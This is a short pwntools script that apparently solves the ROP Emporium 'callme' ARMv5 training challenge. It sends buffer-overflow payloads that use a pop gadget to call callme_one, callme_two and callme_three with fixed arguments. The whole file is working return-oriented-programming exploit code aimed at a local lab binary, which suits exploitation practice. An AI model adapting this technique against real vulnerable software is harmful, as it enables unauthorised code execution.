from pwn import *

context.binary = elf = ELF('./callme_armv5')

''' GADGET
0x00010870      07c0bde8       pop {r0, r1, r2, lr, pc}
'''

pop_r0_r1_r2_lr_pc = 0x00010870

callme_one = elf.sym['callme_one']
callme_two = elf.sym['callme_two']
callme_three = elf.sym['callme_three']
pwnme = elf.symbols['pwnme']

offset = 36


arg = p32(0xdeadbeef)+p32(0xcafebabe)+p32(0xd00df00d)
payload1 = b'A'*offset + p32(pop_r0_r1_r2_lr_pc) + arg + p32(pwnme) + p32(callme_one)
payload2 = b'A'*offset + p32(pop_r0_r1_r2_lr_pc) + arg + p32(pwnme) + p32(callme_two)  
payload3 = b'A'*offset + p32(pop_r0_r1_r2_lr_pc) + arg + p32(pwnme) + p32(callme_three) 

p = elf.process()
#p = gdb.debug(elf.path)

p.recv()

p.sendline(payload1)
p.interactive()
p.sendline(payload2)
p.interactive()
p.sendline(payload3)

log.info(p.recvall())

